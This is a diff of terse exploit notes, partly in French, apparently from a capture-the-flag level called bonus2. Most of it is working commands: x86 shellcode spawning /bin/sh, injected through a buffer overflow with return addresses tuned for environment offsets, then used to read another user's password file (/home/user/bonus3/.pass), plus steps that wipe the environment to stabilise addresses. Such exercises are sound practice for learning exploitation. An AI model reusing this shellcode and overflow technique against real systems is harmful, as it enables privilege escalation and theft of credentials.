@@ -42,4 +42,32 @@ $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
 
 
 
-env -i LANG=fi /home/user/bonus2/bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfd\x08'[::-1])") <<< 'cat /home/user/bonus3/.pass'
+env -i LANG=fi /home/user/bonus2/bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfd\x12'[::-1])") <<< 'cat /home/user/bonus3/.pass'
+
+
+
+bffffcf2 = nice
+bffffd32 = bof
+
+32 de diff entre gdb et le binaire
+
+
+$(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") <<< 'cat /home/user/bonus3/.pass'
+
+
+enlever l'env avec gdb ou sans = `0xbffffcf2`
+- echo $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") > /tmp/test
+- echo $(python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") > /tmp/test2
+- unset $(env | cut -d= -f1)
+- export LANG=fi
+- $(/bin/cat /tmp/test) $(/bin/cat /tmp/test2) <<< "cat '/home/user/bonus3/.pass'"
+
+version sans niquer l'env:
+echo $(echo $(unset $(env | cut -d= -f1); export LANG=fi; /home/user/bonus2/bonus2 $(/usr/bin/python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(/usr/bin/python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") <<< 'cat /home/user/bonus3/.pass'))
+
+
+enlever l'env avec commande `env -i LANG=fi` = `0xbffffd12`
+env -i LANG=fi /home/user/bonus2/bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfd\x12'[::-1])") <<< 'cat /home/user/bonus3/.pass'
+
+cat /home/user/bonus2/.pass
+
